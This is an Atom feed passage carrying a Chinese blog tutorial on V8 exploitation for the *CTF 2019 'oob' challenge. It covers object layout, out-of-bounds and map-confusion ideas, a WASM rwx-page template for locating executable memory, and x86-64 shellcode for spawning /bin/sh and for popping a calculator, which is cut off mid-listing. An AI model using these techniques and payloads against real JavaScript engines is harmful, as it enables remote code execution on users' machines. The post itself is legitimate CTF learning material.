<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Qanux&#39;s space</title>
  
  <subtitle>Nice to meet you!</subtitle>
  <link href="https://qanux.github.io/atom.xml" rel="self"/>
  
  <link href="https://qanux.github.io/"/>
  <updated>2024-05-05T11:36:10.939Z</updated>
  <id>https://qanux.github.io/</id>
  
  <author>
    <name>Qanux</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>初探v8漏洞利用</title>
    <link href="https://qanux.github.io/2024/05/05/v8start/"/>
    <id>https://qanux.github.io/2024/05/05/v8start/</id>
    <published>2024-05-05T11:07:06.040Z</published>
    <updated>2024-05-05T11:36:10.939Z</updated>
    
    <content type="html"><![CDATA[<p>一直觉得 <code>v8</code> 漏洞利用是一件非常好玩的事情，所以找时间入门了一下，这篇博客所使用的环境是 <code>*CTF 2019</code> 的 <code>oob</code>，相关附件读者可以自行上网搜索下载。这篇博客主要用于总结本人在入门 <code>v8</code> 漏洞利用时所学到的东西，由于 <code>Qanux</code> 又菜又爱玩，文章不免存在许多的问题，请读者多多包容  </p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>在开始之前，肯定有很多人想问 v8 是一个什么东西，下面是在知乎中搜到的对于 v8 的描述：  </p><blockquote><p>V8引擎是由C++编写的Google开源高性能JavaScript和WebAssembly引擎，它用于Chrome和Node.js等。<br>V8可以独立运行，也可以嵌入到任何C++应用程序中。<br>V8支持众多操作系统，如Windows、linux、android等，也支持其他硬件架构，如IA32,X64,ARM等，具有很好的可移植和跨平台特性。  </p></blockquote><p>作为 <code>js</code> 引擎，<code>V8</code> 会编译 &#x2F; 执行 <code>JavaScript</code> 代码，管理内存，负责垃圾回收，与宿主语言的交互等。通过暴露宿主对象 (变量，函数等) 到 <code>JavaScript</code>，<code>JavaScript</code> 可以访问宿主环境中的对象，并在脚本中完成对宿主对象的操作。<br>接下来看看 <code>v8</code> 工作原理的简化细分：  </p><img src="/2024/05/05/v8start/1.png" class="" title="我的图图呢">  <p>当 <code>Chrome</code> 或 <code>Node.js</code> 需要执行一段 <code>JavaScript</code> 代码时，它会将源代码传递给 <code>V8</code>。<code>V8</code> 将 <code>JavaScript</code> 源代码送入所谓的解析器 (<code>Parser</code>)，解析器为源代码创建一个抽象语法树 (<code>AST</code>) 表示。<code>AST</code> 随后被传递给新引入的 <code>Ignition</code> 解释器，在那里它被转换成一系列字节码。然后，<code>Ignition</code> 执行这个字节码序列。<br>在执行过程中，<code>Ignition</code> 收集了有关某些操作输入的剖析信息或反馈。其中一些反馈被 <code>Ignition</code> 自身用来加速后续的字节码解释。例如，对于属性访问，如果在所有时间都具有相同的形状 (即你总是为属性a传递一个值，其中 <code>a</code> 是一个字符串)，我们会缓存如何获取 <code>a</code> 值的信息。在后续执行相同的字节码时，我们不需要再次搜索a。这里的底层机制称为内联缓存 (<code>IC</code>)。  </p><p>接下来再聊聊什么是 <code>d8</code>。<code>d8</code> 是一个非常有用的调试工具，你可以把它看成是 <code>debug for V8</code> 的缩写。我们可以使用 <code>d8</code> 来查看 <code>V8</code> 在执行 <code>JavaScript</code> 过程中的各种中间数据，比如作用域、AST、字节码、优化的二进制代码、垃圾回收的状态，还可以使用 <code>d8</code> 提供的私有 <code>API</code> 查看一些内部信息。  </p><h1 id="走进v8"><a href="#走进v8" class="headerlink" title="走进v8"></a>走进v8</h1><p>本来想写写如何配置 <code>v8</code> 环境的，可是网上相关资料太多了，加上笔者比较懒，就没写，等哪天心血来潮再补上吧  </p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>在给 <code>gdb</code> 配置好 <code>v8</code> 的调试文件后，即可利用如下命令来调试我们的 <code>JavaScript</code> 代码：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure><p>这里解释一下命令里面的几个参数：  </p><ul><li>–allow-natives-syntax：开启原生 <code>API</code> (用的比较多)  </li><li>–shell：运行脚本后切入交互模式</li></ul><p>在调试的过程中我们可以在代码中加入如下代码来进行调试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>其中 <code>%DebugPrint(obj);</code> 作用为打印对象的信息 (<code>debug</code> 版本的 <code>d8</code> 可以打印对象的详细信息，而 <code>release</code> 版本的 <code>d8</code> 只会打印对象类型和对象的地址)，<code>%SystemBreak();</code> 的作用类似于断点<br>由于标准的 <code>JavaScript</code> 并不支持以上语法，所以在运行时要加上 <code>--allow-natives-syntax</code> 选项<br>现在使用如下代码来进行测试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>启动效果如下：  </p><img src="/2024/05/05/v8start/2.png" class="" title="我的图图呢">  <p>可以看见打印出了这个整数数组的地址，由于我这个 <code>d8</code> 是 <code>release</code> 版本，所以并没有打印出该数组对象的详细信息，但我们可以使用 <code>job</code> 命令来达到相同的效果  </p><img src="/2024/05/05/v8start/3.png" class="" title="我的图图呢">  <p>这里有个需要注意的点，那就是 <code>DebugPrint</code> 打印出来的是真实地址加一，而 <code>job</code> 命令后面接着的也需要是 <code>object</code> 的真实地址加一，不然会被解析成 <code>smi</code> 类型  </p><h2 id="v8-object的基本结构"><a href="#v8-object的基本结构" class="headerlink" title="v8 object的基本结构"></a>v8 object的基本结构</h2><p>首先给出 <code>object</code> 的通用结构：  </p><img src="/2024/05/05/v8start/4.png" class="" title="我的图图呢">  <p>不同对象的 <code>object</code> 结构都会不一样，但是都有很多相似之处，现在就来详细分析上面给出的例子，为了防止忘记，这里再次贴出代码：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>还是给出一样的结果：  </p><img src="/2024/05/05/v8start/3.png" class="" title="我的图图呢">  <p>可以看出该对象为 <code>JSArray</code>，其结构和 <code>object</code> 的通用结构差不多，但是还是有一点点区别<br>下面是 <code>JSArray</code> 的结构图：</p><img src="/2024/05/05/v8start/5.png" class="" title="我的图图呢">  <p>其各个字段的含义大致如下：  </p><ul><li>map：定义了如何访问对象，具有相同 <code>Map</code> 的两个 <code>JS object</code> ，就代表具有相同的类型（即具有以相同顺序命名的相同属性），比较 Map 的地址即可确定类型是否⼀致，同理，替换掉 Map 就可以进行类型混淆。  </li><li>prototype：对象的原型（如果有） </li><li>elements：对象的地址  </li><li>length：长度</li></ul><p>我们可以在 <code>gdb</code> 中查看 <code>elements</code>  </p><img src="/2024/05/05/v8start/6.png" class="" title="我的图图呢">  <p>可以看见 <code>elements</code> 中的数据也分为 <code>3</code> 层，分别为 <code>map</code> 指针、<code>length</code>、<code>data</code><br>这里还有一个需要注意的地方，那就是 <code>elements</code> 的地址是在 <code>object</code> 的上方的，也就是说程序在申请一个对象时，是先向堆申请一块空间用于存储对象的数据，再申请一块空间用于管理该对象。虽然 <code>elements</code> 是在 obj 上上方，但这并不代表 <code>elements</code> 就一定紧贴着 <code>obj</code>，这个问题我打算留到后面再讲<br>好像相关结构了解到这里就差不多了，如果后面还有别的那就再补补吧（笑  </p><h2 id="v8漏洞利用思想"><a href="#v8漏洞利用思想" class="headerlink" title="v8漏洞利用思想"></a>v8漏洞利用思想</h2><p>通过上面对 <code>object</code> 结构的分析，也许有人已经知道进行漏洞的利用了。可以猜测我们对一个对象进行访问时下标的最大值是由 <code>elements</code> 上的 <code>length</code> 所决定的，如果我们可以修改这个 <code>length</code> 为一个很大的值，我们就能够做到越界读写。同时，如果我们可以修改 <code>obj</code> 中的 <code>map</code>，我们令其出现神奇的效果，具体在下面漏洞利用中再分析<br>在平时的 <code>CTF</code> 题目中我们的目的是如何让程序执行 <code>system(&quot;/bin/sh&quot;)</code>，而在 <code>v8</code> 中，我们的目的是让 v8 任意执行我们的 <code>shellcode</code><br>然而实现这一切需要一个前提，那就是需要存在 <code>rwx</code> 权限的区域。这时候就需要 <code>WASM</code> 登场了<br>什么是 <code>WASM</code>？顾名思义，是 <code>Asm on the web</code>，但其实不是真正意义上的汇编，只是更加接近汇编。<code>WASM</code> 可以在 <code>Javascript Engine</code> 的地址空间中导入一块可读可写可执行的内存页。<br>下面看看这一段代码：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasm_mod);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line">0x0d1dfcf5f929 &lt;JSFunction 0 (sfi = 0xd1dfcf5f8f1)&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f929</span><br><span class="line">0xd1dfcf5f929: [Function] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0d1dfcf42109 &lt;JSFunction (sfi = 0xe9259bc3b29)&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - <span class="keyword">function</span> prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x0d1dfcf5f8f1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0xd1dfcf5f731</span><br><span class="line"> - WASM <span class="keyword">function</span> index 0</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x0e9259bc04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#name: 0x0e9259bc0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#arguments: 0x0e9259bc0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#caller: 0x0e9259bc03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: not available</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看见此时内存已经出现了拥有 <code>rwx</code> 权限的区域</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">0xfb58ac2e000      0xfb58ac2f000 rwxp     1000      0 [anon_fb58ac2e]</span><br></pre></td></tr></table></figure><p>现在的问题是我们要如何获取到这个内存区域的地址，我们来查看一下 <code>f</code> 的 <code>shared_info</code> 结构的信息：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8f1</span><br><span class="line">0xd1dfcf5f8f1: [SharedFunctionInfo] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d409e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x0d1dfcf5f8c9 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - <span class="keyword">function</span> token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x0cb6b4d40c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0xcb6b4d42a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x0cb6b4d41319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下里再查看其 <code>data</code> 结构：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8c9</span><br><span class="line">0xd1dfcf5f8c9: [WasmExportedFunctionData] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d45879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line"> - function_index: 0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>再查看 <code>instance</code> 结构：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>仔细查看能发现，<code>instance</code> 结构就是 <code>js</code> 代码中的 <code>wasm_mod</code> 变量的地址<br>我们再来查看这个结构的内存布局：  </p><img src="/2024/05/05/v8start/7.png" class="" title="我的图图呢">  <p>仔细看，能发现，<code>rwx</code> 段的起始地址储存在 <code>instance+0x88</code> 的位置，不过这个不用记，不同版本，这个偏移值可能会有差距，可以在写 <code>exp</code> 的时候通过上述调试的方式进行查找。<br>根据 WASM 的特性，我们的目的可以更细化了，现在我们的目的变为了把 <code>shellcode</code> 写到 <code>WASM</code> 的代码段，然后执行 <code>WASM</code> 函数，那么就能执行 <code>shellcode</code> 了。<br>这里可以写成一个固定的模板：   </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br></pre></td></tr></table></figure><p>其中 <code>arbitrary_address_read</code> 函数的具体实现方式要看具体的漏洞环境  </p><h2 id="常用shellcode"><a href="#常用shellcode" class="headerlink" title="常用shellcode"></a>常用shellcode</h2><p>在 <code>CTF</code> 题目中，我们的目的大多数是 <code>getshell</code> 然后获取 <code>flag</code>，用于 <code>getshell</code> 的 <code>shellcode</code> 如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>当然我们也可以令其弹计算器，<code>shellcode</code> 如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0xc0e8f0e48348fcn</span>,</span><br><span class="line">    <span class="number">0x5152504151410000n</span>,</span><br><span class="line">    <span class="number">0x528b4865d2314856n</span>,</span><br><span class="line">    <span class="number">0x528b4818528b4860n</span>,</span><br><span class="line">    <span class="number">0xb70f4850728b4820n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314d4a4an</span>,</span><br><span class="line">    <span class="number">0x41202c027c613cacn</span>,</span><br><span class="line">    <span class="number">0xede2c101410dc9c1n</span>,</span><br><span class="line">    <span class="number">0x8b20528b48514152n</span>,</span><br><span class="line">    <span class="number">0x88808bd001483c42n</span>,</span><br><span class="line">    <span class="number">0x6774c08548000000n</span>,</span><br><span class="line">    <span class="number">0x4418488b50d00148n</span>,</span><br><span class="line">    <span 